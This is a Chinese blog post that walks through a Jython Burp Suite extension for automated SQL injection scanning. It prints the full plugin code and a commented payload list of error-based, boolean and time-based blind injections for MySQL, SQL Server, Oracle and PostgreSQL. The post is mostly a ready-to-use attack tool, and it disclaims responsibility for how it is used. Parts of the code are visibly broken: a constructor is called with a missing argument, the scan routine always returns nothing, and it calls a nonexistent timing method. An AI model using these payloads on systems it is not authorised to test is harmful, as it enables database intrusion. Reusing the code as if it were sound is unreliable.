#  抓包学的好，劳饭吃的饱，利用Burp Suite插件进行自动化漏洞挖掘【附完整代码】   
 Sec探索者   2024-03-13 09:53  
  
## 需求分析  
  
测试sql基本注入的载荷，在可能有sql发送测试包，目前只测试url中的，并可以根据错误回显判断出数据库类型，需要有用户界面，可以加载到Burp的Extensions模块  
# 环境准备：Jython  
  
BurpSuite 是使用 Java 编程语言编写的，所以想要使用 Python 编程语言开发其插件，就必须借助于 Jython。Jython 本质上是一个 Java 应用程序，它允许 coder 们使用 Java 代码调用 Python 库反之，也可以使用 Python 调用 Java 的库。  
  
有关 Jython 的详细使用，请读者参阅 Jython 官网的用户手册 和 相关 doc。  
  
类似于 Jython 的 Project 还有 JRuby ，并且 Burp 也支持 ruby 编写插件，但是无论是用 Python 还是 Ruby 编写的插件，在执行效率方面远远不如原生的 Java 高，所以笔者还是建议使用 Java 编写插件。  
  
编写代码  
```
pip install  burp
```  
  
需要注意改动代码按照python2.7版本去，如果比这个版本高的方式写可能导入会报错  
```
from burp import IBurpExtender, IContextMenuFactory, ITab, IScannerCheck, IScanIssue, IHttpService, IHttpRequestResponse, IExtensionStateListener, IParameter, IProxyListener, IScannerInsertionPointProvider, IScannerInsertionPoint, IBurpExtenderCallbacks
from javax.swing import JTabbedPane, JPanel, JButton, JTextArea, JScrollPane, SwingConstants, GroupLayout, JTextField, JMenuItem, SwingUtilities
from java.awt import BorderLayout, Color
from java.util import ArrayList
from java.awt.event import ActionListener
from java.net import URL
import sys
import threading
 
class ScanIssue(IScanIssue):
 
    def __init__(self, helpers, http_service, url, request_response, name, detail, severity, confidence):
        self._helpers = helpers
        self._http_service = http_service
        self._url = url
        self._request_response = request_response
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence
        
 
    def getUrl(self):
        return self._url
 
    def getIssueName(self):
        return self._name
 
    def getIssueType(self):
        return 0
 
    def getSeverity(self):
        return self._severity
 
    def getConfidence(self):
        return self._confidence
 
    def getIssueBackground(self):
        return None
 
    def getRemediationBackground(self):
        return None
 
    def getIssueDetail(self):
        return self._detail
 
    def getRemediationDetail(self):
        return None
 
    def getHttpMessages(self):
        return self._request_response
 
    def getHttpService(self):
        return self._http_service
 
 
class BurpExtender(IBurpExtender, ITab, IScannerCheck, IContextMenuFactory, ActionListener, IScannerInsertionPointProvider):
 
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
 
        self._scan_lock = threading.Lock()
        self._tabbedPane = JTabbedPane()
        self.initUI()
        
        callbacks.registerScannerInsertionPointProvider(self)
        #模块名称
        callbacks.setExtensionName("SQL Injection Scanner")
        callbacks.registerContextMenuFactory(self)
        callbacks.customizeUiComponent(self._tabbedPane)
        callbacks.registerScannerCheck(self)
        callbacks.addSuiteTab(self)
 
    def initUI(self):
        self._mainPanel = JPanel(BorderLayout())
 
        self._urlInput = JTextField(50)
 
        self._scanButton = JButton("Start Scan", actionPerformed=self.start_scan)
 
        self._scanOutput = JTextArea()
        self._scanOutput.setEditable(False)
        scrollPane = JScrollPane(self._scanOutput)
 
        layout = GroupLayout(self._mainPanel)
        self._mainPanel.setLayout(layout)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
 
        layout.setHorizontalGroup(
            layout.createParallelGroup(GroupLayout.Alignment.CENTER)
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self._urlInput)
                    .addComponent(self._scanButton))
                .addComponent(scrollPane)
        )
 
        layout.setVerticalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._urlInput)
                    .addComponent(self._scanButton))
                .addComponent(scrollPane)
        )
 
        self._tabbedPane.addTab("SQL Injection Scanner", self._mainPanel)
 
    def getTabCaption(self):
        return "SQL Injection Scanner"
 
    def getUiComponent(self):
        return self._tabbedPane
 
    def createInsertionPoints(self, baseRequestResponse):
        request_info = self._helpers.analyzeRequest(baseRequestResponse)
        parameters = request_info.getParameters()
 
        insertion_points = []
        for param in parameters:
            if param.getType() != IParameter.PARAM_URL:
                continue
 
            # 创建自定义插入点
            insertion_point = CustomInsertionPoint(self._helpers, baseRequestResponse.getRequest(), param)
            insertion_points.append(insertion_point)
 
        return insertion_points
 
       
    def start_scan(self, event):
        print("Start Scan button clicked.")
        thread = threading.Thread(target=self.scan_logic)
        thread.start()
 
 
    def scan_logic(self):
 
        try:
            print("scan_logic started")
            target_url = self._urlInput.getText()
            try:
                url = URL(target_url)
            except Exception as e:
                print("Error: Invalid URL")
                SwingUtilities.invokeLater(lambda: self._scanOutput.append("Error: Invalid URL\n"))
                return
 
            baseRequestResponse = self._callbacks.makeHttpRequest(
                self._helpers.buildHttpService(url.getHost(), url.getPort(), url.getProtocol() == "https"),
                self._helpers.stringToBytes("GET {} HTTP/1.1\r\nHost: {}\r\n\r\n".format(url.getPath(), url.getHost()))
            )
            # Manually parse the URL to get the query string
            query_string = url.getQuery()
 
            if not query_string:
                print("No query string found.")
                return
 
            # Split the query string into parameters
            query_params = query_string.split("&")
 
            # Create a list to store the parameters
            params = []
 
            # 遍历查询参数
            for query_param in query_params:
                # Split the parameter into name and value
                name, value = query_param.split("=", 1)
                # Create a new URL parameter and add it to the list
                param = self._helpers.buildParameter(name, value, IParameter.PARAM_URL)
                params.append(param)
 
            print("Number of parameters found:", len(params))
 
            # 检查参数是否存在
            if not params:
                print("No parameters found.")
                return
 
            # 创建列表插入点
            insertion_points = []
 
            # 遍历参数
            for param in params:
                print("Creating insertion point for parameter:", param.getName())
                # Create an instance of your custom insertion point class
                insertion_point = CustomInsertionPoint(self._helpers, baseRequestResponse.getRequest(), param)
                insertion_points.append(insertion_point)
 
            # 打印插入点数量
            print("Number of insertion points created:", len(insertion_points))
 
            issues = self.doActiveScan(baseRequestResponse, [])
            if issues:
                for issue in issues:
                    print("Found issue: {} - {}".format(issue.getUrl(), issue.getIssueName()))
                    SwingUtilities.invokeLater(lambda: self._scanOutput.append("{} - {}\n".format(issue.getUrl(), issue.getIssueName())))
            else:
                print("No issues found.")
                SwingUtilities.invokeLater(lambda: self._scanOutput.append("{} - Scan result\n".format(target_url)))
            print("scan_logic method finished.")
            SwingUtilities.invokeLater(lambda: self._callbacks.issueAlert("Start scan clicked"))
            # 定义sql注入payload
            payloads = [
                "'",                     
                '"',                     
                " OR 1=1",               
                "' OR '1'='1",           
                " AND SLEEP(3)",         
                "'; WAITFOR DELAY '0:0:3';",
                " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),3)", 
                "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
                "' AND 1=CAST(0x5F21403264696C656D6D61 AS varchar(8000))--",
                "' AND extractvalue(1,concat(0x5c, (SELECT @@version)))",
                "' AND 1=pg_sleep(3)--",
                "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)--",
                " AND 1=(SELECT @@version)--"
            ]
 
            # 遍历插入payload
            for insertion_point in insertion_points:
                print("Testing insertion point: {}".format(insertion_point.getInsertionPointName()))
                self._original_response = baseRequestResponse.getResponse()
                self._original_response_body = self._helpers.bytesToString(self._original_response)
                for payload in payloads:
                    # print("Testing insertion point: ",insertion_point.getInsertionPointName())
                    # print("Testing payload: ",payload)
 
                    # # Insert the payload into the request
                    # modified_request = insertion_point.buildRequest(payload)
 
                    # # Send the modified request
                    # checkRequestResponse = self._callbacks.makeHttpRequest(
                    #     baseRequestResponse.getHttpService(), modified_request)
 
                    # # Check if the response indicates a potential SQL injection
                    # if self.check_for_sql_injection(checkRequestResponse.getResponse()):
                    #     print("Potential SQL injection found with payload: ",payload)
 
                    #     # Add the issue to the SQL Injection Scanner module
                    #     SwingUtilities.invokeLater(lambda: self._scanOutput.append(
                    #         "{} - Potential SQL injection with payload: {}\n".format(target_url, payload)
                    #     ))
                    # else:
                    #     print("No issues found with payload: ",payload)
                    #     SwingUtilities.invokeLater(lambda: self._scanOutput.append(
                    #         "{} - No issues found with payload: {}\n".format(target_url, payload)
                    #     ))
                    print("Testing payload: {}".format(payload))
                    attack_request = insertion_point.buildRequest(payload)
                    attack_response = self._callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(),
                        attack_request
                    )
                    if self.check_sql_injection(attack_response, payload):
                        print("Potential SQL injection found with payload:",payload)
                        SwingUtilities.invokeLater(lambda: self._scanOutput.append(
                            "{} - Potential SQL injection with payload: {}\n".format(target_url, payload)
                        ))
                    else:
                        print("No issues found with payload:", payload)
                        SwingUtilities.invokeLater(lambda: self._scanOutput.append(
                            "{} - No issues found with payload: {}\n".format(target_url, payload)
                        ))
            print("scan_logic method finished.")
        except Exception as e:
            print("scan_logic error: ", e)
 
 
    def check_for_sql_injection(self, response):
        sql_errors = [
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "Warning: mysqli_",
            "Fatal error: Uncaught PDOException",
            "syntax error or access violation"
        ]
 
        response_str = self._helpers.bytesToString(response)
        for sql_error in sql_errors:
            if sql_error in response_str:
                return True
 
        return False
 
 
    #这个方法里面的内容其实我合并到上面scann方法里面了
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        print("Number of insertion points created: {}".format(len(insertionPoint)))
        issues = []
        if not insertionPoint:
            insertion_points = self.createInsertionPoints(baseRequestResponse)
        else:
            insertion_points = [insertionPoint]
 
        # for insertion_point in insertion_points:
        #     print("Testing insertion point: {}".format(insertion_point.getInsertionPointName()))
        #     self._original_response = baseRequestResponse.getResponse()
        #     self._original_response_body = self._helpers.bytesToString(self._original_response)
        #     payloads = [
        #         "'",                     
        #         '"',                     
        #         " OR 1=1",               
        #         "' OR '1'='1",           
        #         " AND SLEEP(3)",         
        #         "'; WAITFOR DELAY '0:0:3';",
        #         " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),3)", 
        #         "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--",
        #         "' AND 1=CAST(0x5F21403264696C656D6D61 AS varchar(8000))--",
        #         "' AND extractvalue(1,concat(0x5c, (SELECT @@version)))",
        #         "' AND 1=pg_sleep(3)--",
        #         "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)--",
        #         " AND 1=(SELECT @@version)--"
        #     ]
 
        #     for payload in payloads:
        #         print("Testing payload: {}".format(payload))
        #         attack_request = insertion_point.buildRequest(payload)
        #         attack_response = self._callbacks.makeHttpRequest(
        #             baseRequestResponse.getHttpService(),
        #             attack_request
        #         )
        #         if self.check_sql_injection(attack_response, payload):
        #             issues.append(self.create_scan_issue(baseRequestResponse, attack_request, attack_response))
        #         else:
        #             print("No issues found with payload: {}".format(payload))
        return issues
        
 
    def check_sql_injection(self, response, payload):
        response_body = self._helpers.bytesToString(response.getResponse())
        sql_errors = [
            "SQL syntax",
            "MySQL error",
            "SQL error",
            "syntax error",
            "ORA-01756",
            "Microsoft OLE DB Provider for ODBC Drivers error",
            "Unclosed quotation mark",
            "Error Executing Database Query"
        ]
 
        for error in sql_errors:
            if error in response_body:
                return True
 
        if " OR 1=1" in payload or "' OR '1'='1" in payload:
             if response_body != self._original_response_body:
                return True
 
        time_based_payloads = [" AND SLEEP(", "'; WAITFOR DELAY '", " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(", "' AND 1=pg_sleep("]
        if any(p in payload for p in time_based_payloads):
            time_difference = self._helpers.analyzeResponse(response.getResponse()).getTime() - self._helpers.analyzeResponse(self._original_response).getTime()
 
            if time_difference >= 3000:
                return True
 
        return False
 
    def create_scan_issue(self, baseRequestResponse, attack_request, attack_response):
        return ScanIssue(
            self._helpers,
            baseRequestResponse.getHttpService(),
            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
            [self._callbacks.applyMarkers(baseRequestResponse, None, None), self._callbacks.applyMarkers(attack_response, None, None)],
            "SQL Injection",
            "High",
            "Certain"
        )
 
    def send_to_scanner(self, event):
        messages = self._current_invocation.getSelectedMessages()
        if messages:
            url = messages[0].getUrl()
            self._urlInput.setText(url.toString())
        ui_component = self.getUiComponent()
        ui_component.setForeground(Color.red)
        self._callbacks.customizeUiComponent(ui_component)
        # self._callbacks.customizeUiComponent(self.getUiComponent().setForeground(Color.red))
 
    def createMenuItems(self, invocation):
        self._current_invocation = invocation
        menu_items = ArrayList()
        menu_item = JMenuItem("Send to SQL Injection Scanner", actionPerformed=self.send_to_scanner)
        menu_items.add(menu_item)
        return menu_items
 
    def menuItemClicked(self, event):
        current_request = self._callbacks.getSelectedMessages()[0]
        base_request_response = current_request.getRequestResponse()
        issues = self.doActiveScan(base_request_response, None)
        for issue in issues:
            print("{} - {}".format(issue.getUrl(), issue.getIssueName()))
 
 
    def doPassiveScan(self, baseRequestResponse):
        return []
 
 
class CustomInsertionPoint(IScannerInsertionPoint):
    def __init__(self, helpers, request, parameter=None, is_path_insertion_point=False):
        self._helpers = helpers
        self._request = request
        self._parameter = parameter
        self._is_path_insertion_point = is_path_insertion_point
 
    def getInsertionPointName(self):
        if self._is_path_insertion_point:
            return "Custom Path Insertion Point"
        return "Custom Insertion Point: {}".format(self._parameter.getName())
 
    def getBaseValue(self):
        if self._is_path_insertion_point:
            return self._helpers.analyzeRequest(self._request).getUrl().getPath()
        return self._parameter.getValue()
 
    def buildRequest(self, payload):
        if self._is_path_insertion_point:
            url = self._helpers.analyzeRequest(self._request).getUrl()
            new_path = url.getPath() + payload
            new_url = URL(url.getProtocol(), url.getHost(), url.getPort(), new_path)
            return self._helpers.buildHttpRequest(new_url)
        return self._helpers.updateParameter(self._request, self._helpers.buildParameter(self._parameter.getName(), payload, self._parameter.getType()))
 
    def getPayloadOffsets(self, payload):
        return None
 
    def getInsertionPointType(self):
        return IScannerInsertionPoint.INS_PARAM_URL
 
```  
## 三、数据库类型检测  
  
        增加针对不同数据库类型的攻击载荷，并添加检测时间盲注和布尔盲注的方法。这将使得扩展更加强大，能够检测到更多类型的SQL注入攻击。  
```
payloads = [
    "'",                     # 错误提示
    '"',                     # 错误提示
    " OR 1=1",               # 布尔盲注
    "' OR '1'='1",           # 布尔盲注
    " AND SLEEP(3)",         # MySQL时间盲注
    "'; WAITFOR DELAY '0:0:3';",    # SQL Server时间盲注
    " AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),3)", # Oracle时间盲注
    "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--", # Oracle基于错误的注入
    "' AND 1=CAST(0x5F21403264696C656D6D61 AS varchar(8000))--",  # SQL Server基于错误的注入
    "' AND extractvalue(1,concat(0x5c, (SELECT @@version)))", # MySQL基于错误的注入
    "' AND 1=pg_sleep(3)--",    # PostgreSQL时间盲注
    "' AND 1=(SELECT banner FROM v$version WHERE rownum=1)--",  # Oracle布尔盲注
    " AND 1=(SELECT @@version)--"  # MySQL布尔盲注
]
```  
## 四、测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2UziaylhrCibFJ89EGSPaFmTcaO74L2hthuuzMS9diaeMFlbEeK2Dziaia3fqaCp2hGjDsn2T8RTmQUJfnGNnBG6Q9w/640?wx_fmt=png&from=appmsg "")  
  
这是最基础的检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2UziaylhrCibFJ89EGSPaFmTcaO74L2hthD5g9LgUQN1nmZdPNwAwMqBD0EsKazUtjIKV8ML0GaCaSicQ9b795hpA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2UziaylhrCibFJ89EGSPaFmTcaO74L2hthIlrkX4XBG001fttDKAdKlPS8LUkKf8JaDhpJ8RfAnVlJvHBgoHhGdA/640?wx_fmt=png&from=appmsg "")  
  
文章中的代码可能复制粘贴格式有问题，公众号：「  
吉吉说安全」，对我发消息【  
burp_sql】获取完整代码  
  
**倾心制作，【**  
**点赞****】【**  
**在看****】【**  
**转发****】祝君一帆风顺，二龙腾飞，三羊开泰，四季平安，五福临门，六六大顺，七星高照，八方来财，九九同心，十全十美，百事亨通，千事吉祥，万事如意。**  
  
免责声明  
  
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为  
此  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
举指高雅气度非凡落落大方大将风范  
  
  
